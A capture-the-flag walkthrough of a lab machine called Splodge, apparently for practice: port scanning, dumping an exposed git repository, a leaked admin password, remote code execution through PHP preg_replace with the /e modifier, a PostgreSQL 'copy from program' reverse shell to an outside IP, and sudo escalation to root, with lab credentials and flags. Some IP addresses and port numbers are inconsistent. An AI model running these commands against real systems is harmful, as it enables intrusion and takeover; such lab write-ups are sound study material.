@@ -1,0 +1,228 @@
+																							                     Splodge Walkthrough
+																										
+Attacker's Machine: 192.168.49.68
+Victim's Machine: 192.168.201.108
+export IP=192.168.201.108
+	
+nmap -Pn -p- -n  --min-rate 1000 $IP --stats-every=5s
+
+22/tcp   open  ssh
+80/tcp   open  http
+1337/tcp open  waste
+5432/tcp open  postgresql
+8080/tcp open  http-proxy
+
+nmap -Pn -n -sC -sV -p22,80,1337,5432,8080 $IP --open --stats-every=5s -oN results.txt
+
+22/tcp   open  ssh               OpenSSH 7.4 (protocol 2.0)
+80/tcp   open  http              nginx 1.16.1
+| http-git: 
+|   192.168.204.108:80/.git/
+|     Git repository found!
+|     .gitignore matched patterns 'bug' 'key'
+|     .git/config matched patterns 'user'
+1337/tcp open  http               nginx 1.16.1
+|_http-title: Commando
+5432/tcp open  postgresql     PostgreSQL DB 12.3 - 12.4
+8080/tcp open  http              nginx 1.16.1
+|_http-title: Splodge | Home
+
+nmap -sU -n -Pn $IP --top-ports=100 --stats-every=5s --min-rate 1000
+ <!-- nothing -->
+
+Vulnerability Assessment
+
+nmap -n $IP -p 80 -sV --script vuln --stats-every=5s 
+
+
+nikto --url $IP -p 80
+
+Port 80
+Enumeration
+
+gobuster dir -u http://$IP:80 -w /usr/share/wordlists/find_me.txt -t 40 
+/.git/index
+/.git
+/.git/config
+/.gitignore
+/.gitattributes
+/resources
+/app
+/config
+/database
+/public
+/routes              
+/storage
+/vendor
+/artisan
+/bootstrap
+
+# Nothing really special so far, we found am email address in the /.git/config files. Maybe it can be usefull later on?
+
+[user]
+	name = The Splodge
+	email = admin@splodge.offsec
+
+Port 1337
+
+# Nothing so far
+
+Port 8000
+Enumeration
+
+gobuster dir -u http://$IP:8080 -w /usr/share/wordlists/find_me.txt -t 40
+
+/admin                (Status: 302) [Size: 378] [--> http://192.168.221.108:8080/login]
+/login                (Status: 200) [Size: 12149]
+/index.php            (Status: 200) [Size: 12717]
+/robots.txt           (Status: 200) [Size: 24]
+
+# We have a login page, let's see if we get anything going. Aparently not. We need to get back to other ports.
+
+Back to Port 80
+
+# There is a git repository hosted on port80 and the directory listing is disabled. Since normal wordlist aren't too good, let's use a script designed for git repositories which do not have directory listing enabled.
+
+https://github.com/internetwache/GitTools/tree/master/Dumper
+
+./gitdumpster.sh http://$IP/.git/ splonk
+cd splonk
+
+# When you first clone a git repository, the working directory will contain the files from the last committed state of the repository. Let's check to see if there were any changes?
+
+git status
+
+On branch master
+Changes not staged for commit:
+  (use "git add/rm <file>..." to update what will be committed)
+  (use "git restore <file>..." to discard changes in working directory)
+        deleted:    .gitattributes
+        deleted:    .gitignore
+        deleted:    app/Console/Kernel.php
+        deleted:    app/Exceptions/Handler.php
+        deleted:    app/Http/Controllers/AdminController.php
+        deleted:    app/Http/Controllers/Auth/ForgotPasswordController.php
+        deleted:    app/Http/Controllers/Auth/LoginController.php
+        deleted:    app/Http/Controllers/Auth/RegisterController.php
+        deleted:    app/Http/Controllers/Auth/ResetPasswordController.php
+        deleted:    app/Http/Controllers/Controller.php
+        deleted:    app/Http/Controllers/PostController.php
+        deleted:    app/Http/Kernel.php
+        deleted:    app/Http/Middleware/EncryptCookies.php
+        deleted:    app/Http/Middleware/RedirectIfAuthenticated.php
+        deleted:    app/Http/Middleware/TrimSt
+
+# However, if you make any changes to these files before committing them, these changes will be tracked by git as "uncommitted changes". Make sure you are in the directory where you downloaded the repository.
+   This command will reset the repository to the last commit.
+   
+git checkout -- .
+or 
+git restore .
+
+
+
+ls -lsa
+  4 drwxr-xr-x 11 root root   4096 Apr 16 11:58 .
+  4 drwx------ 13 kali kali   4096 Apr 16 11:56 ..
+  4 drwxr-xr-x  7 root root   4096 Apr 16 11:58 app
+  4 -rwxr-xr-x  1 root root   1646 Apr 16 11:58 artisan
+  4 drwxr-xr-x  3 root root   4096 Apr 16 11:58 bootstrap
+  4 -rw-r--r--  1 root root   1300 Apr 16 11:58 composer.json
+144 -rw-r--r--  1 root root 144904 Apr 16 11:58 composer.lock
+  4 drwxr-xr-x  2 root root   4096 Apr 16 11:58 config
+  4 drwxr-xr-x  5 root root   4096 Apr 16 11:58 database
+  4 drwxr-xr-x  6 root root   4096 Apr 16 11:58 .git
+  4 -rw-r--r--  1 root root    111 Apr 16 11:58 .gitattributes
+  4 -rw-r--r--  1 root root    146 Apr 16 11:58 .gitignore
+  4 -rw-r--r--  1 root root   1043 Apr 16 11:58 phpunit.xml
+  4 drwxr-xr-x  3 root root   4096 Apr 16 11:58 public
+  4 drwxr-xr-x  5 root root   4096 Apr 16 11:58 resources
+  4 drwxr-xr-x  2 root root   4096 Apr 16 11:58 routes
+  4 -rw-r--r--  1 root root    563 Apr 16 11:58 server.php
+  4 drwxr-xr-x  5 root root   4096 Apr 16 11:58 storage
+  
+cd database
+cd seeds
+cat DatabaseSeeder.php
+
+DB::table('settings')->insert([
+            'title' => 'Splodge',
+            'filter' => '//',
+            'replacement' => '',
+            'password' => 'SplodgeSplodgeSplodge'
+        ]);
+        
+# Ok, at least we have a password. Remember that we had two posts on port 8080 from admin user? Let's go back to the login page http://192.168.204.108:8080/login and try the new password.
+
+admin
+SplodgeSplodgeSplodge
+
+# We're in!
+   When you visit the admin panel, you notice that you can use a feature that allows you to filter input and replace it with other values.
+   Let's see if you can find the configuration file that contains the source code, maybe we can see exactly what's going on and which function is being used.
+   
+cd /splonk/app/Http/Controllers
+cat PostController.php
+
+public function comment(Request $request, Post $post)
+    {
+        error_reporting(E_ALL & ~E_NOTICE & ~E_DEPRECATED);
+        $author = $request->input('commentAuthor');
+        $message = $request->input('commentMessage');
+        $settings = DB::table('settings')->first();
+        $message = preg_replace($settings->filter, $settings->replacement, $message);
+        DB::table('comments')->insert(['post_id' => $post->id, 'author' => $author, 'message' => $message]);
+        $comments = DB::table('comments')->where('post_id', '=', $post->id)->get();
+        return view('post', ['post' => $post, 'comments' => $comments]);
+    }
+    
+# We can see that the preg_replace function is being used. The function contains a known vulnerability which may lead to RCE.
+
+https://captainnoob.medium.com/command-execution-preg-replace-php-function-exploit-62d6f746bda4
+
+In regular expressions, the /e modifier (which you are using with the /a pattern) is used to evaluate the replacement string as PHP code. 
+This means that any PHP code within the replacement string will be executed.
+
+Knowning that, lets use a filter using /a/e which will execute our command when the user use a as an input.
+Let's use a payload that will get us a shell on the system, we will use a port already opened on the machine.
+
+
+
+nc -lnvp 1337                                                  # Got shell
+
+cd /home/thesplodge  
+cat local.txt                                                     # Flag: ef0ecc66920c6c090db379c7d6472dcb    
+
+
+Privilege escalation
+
+# Running linpeas, we discover the PostgreSQL DB credentials
+
+-rw-r--r--. 1 501 games 362 Oct 17  2020 /usr/share/nginx/html/.env                                                                                                                          
+DB_HOST=127.0.0.1
+DB_PORT=5432
+DB_DATABASE=splodge
+DB_USERNAME=postgres
+DB_PASSWORD=PolicyWielderCandle120
+
+
+psql -h 192.168.201.108 -U postgres -p 5432
+
+create table shell(output text);
+
+nc -lvnp 1337
+
+copy shell from program '/bin/sh -i >& /dev/tcp/192.168.45.5/1337 0>&1';
+
+# Got shell
+
+id
+uid=1000(thesplodge) gid=1000(thesplodge) groups=1000(thesplodge)
+
+sudo -l
+(ALL) NOPASSWD: /bin/bash
+
+sudo /bin/bash
+id
+uid=0(root) gid=0(root) groups=0(root)
+cat /root/proof.txt                                      # Flag: 09559de7d296f24eb43081eefc72a3d5
